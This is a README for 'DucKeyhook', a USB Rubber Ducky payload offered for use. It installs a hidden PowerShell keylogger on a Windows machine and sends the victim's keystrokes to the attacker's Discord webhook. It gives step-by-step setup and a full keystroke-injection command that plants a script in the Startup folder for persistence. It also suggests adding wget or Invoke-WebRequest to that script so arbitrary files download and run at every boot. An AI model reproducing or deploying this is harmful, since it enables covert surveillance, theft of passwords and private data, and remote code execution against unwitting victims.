# DucKeyhook 
> Chris Taylor [Blue Cosmo]
---

```
      :::::::::  :::    :::  ::::::::  :::    ::: :::::::::: :::   ::: :::    :::  ::::::::   ::::::::  :::    ::: 
     :+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:        :+:   :+: :+:    :+: :+:    :+: :+:    :+: :+:   :+:   
    +:+    +:+ +:+    +:+ +:+        +:+  +:+   +:+         +:+ +:+  +:+    +:+ +:+    +:+ +:+    +:+ +:+  +:+     
   +#+    +:+ +#+    +:+ +#+        +#++:++    +#++:++#     +#++:   +#++:++#++ +#+    +:+ +#+    +:+ +#++:++       
  +#+    +#+ +#+    +#+ +#+        +#+  +#+   +#+           +#+    +#+    +#+ +#+    +#+ +#+    +#+ +#+  +#+       
 #+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#           #+#    #+#    #+# #+#    #+# #+#    #+# #+#   #+#       
#########   ########   ########  ###    ### ##########    ###    ###    ###  ########   ########  ###    ###        
```

## Overview:
DucKeyhook is a USB RubberDucky payload that uses PowerShell to log keystrokes. It will send the logs to you via discord. The keylogger almost gives you a "live feed" of their keystrokes through discord. However, you can tweak the timing to get the logs sent to you quick
- moves *c.cmd* file to windows startup directory
- *c.cmd* will secretly run *p.ps1*
- *p.ps1* will log keystrokes 
- *l.ps1* will execute *p.ps1* every minue
    - this can be changed to a preferred delay
- *uninstaller.cmd* uninstalls the payload from the target computer

## Resources:
- [YouTube Video](https://www.youtube.com/watch?v=uHIZZYFeVJA)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Twin-Duck firmware
- Discord Webhook
- Windows Target

## Download:
```bash
svn checkout https://github.com/CosmodiumCS/payloads/trunk/rubberducky/DucKeyhook
```

## Instructions:
**Create Discord Webhook**
1. create a discord server by clicking the plus button in the bottom left

![Create Server](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/create-server.png)

2. go into the `integrations` section in the server's settings
3. click `Webhooks`
![Integrations](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/integrations.png)

4. create a new webhook by clicking `New Webhook`
5. click `Copy Webhook URL` to copy the webhook URL
![Webhook](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/webhook.png)

**Set-Up/Installation**
1. in line 5 of *p.ps1*, replace `DISCORDWEBHOOK` with the webhook URL 
```powershell
$webhook = "DISCORDWEBHOOK"
```
2. in line 16 *payload.txt*, change `'L'` to the name of your microSD card
```powershell
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\l.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
```
4. flash Twin-Duck firmware on to your duck
    - [Tutorial](https://www.youtube.com/watch?v=BzYH-BPHLpE)
5. load, encode, and deploy!!

## Log Sending Delay
Changing the delay between log sends
1. in line 12 of *l.ps1*, change `60` to your preferred number of seconds
```powershell
Start-Sleep 60
```

## Extraneous:
The *c.cmd* attack opportunity
```
the c.cmd file runs every startup.
this means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
the file would then save in the startup directory,
allowing it to run every startup
```
---
- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)
